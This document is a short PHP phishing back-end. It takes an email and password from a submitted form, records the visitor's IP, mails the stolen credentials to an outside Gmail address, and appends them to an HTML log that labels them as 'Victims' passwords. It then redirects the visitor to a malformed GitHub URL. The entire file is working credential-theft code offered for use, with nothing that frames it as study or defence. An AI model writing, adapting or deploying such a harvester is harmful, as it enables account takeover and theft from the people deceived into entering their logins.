<?php
if (isset($_POST['submit'])) {
  $email = $_POST['email'];
  $pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("sendgmail.html", "a"); 
$value =unpack('H*','email');

 
  $headers = "MIME-Version: 1.0" . "\r\n";
  $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
  $message = "<html>
  <head>
  	<title>New message from website contact form</title>
  </head>
  <body>
  	<h1>Account</h1>
  	<p>Email: ".$email." <br>Password: ".$pass."</p>
  	
  </body>
  </html>";
  if (mail('killerh815@gmail.com',$email,$pass,$headers)) {
}
}

fwrite ($f, 'Victims Name: [<b><font color="#ffffff">'.$email.'</font></b>] Victims Password: [<b><font color="#ffffff">'.$pass.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>] By: [<b><font color="#005700"><a href="http://www.messenger.com/" rel="nofollow">messenger</a></font></b>]<br>');
fclose ($f);


header("Location:https://https://github.com/");
?>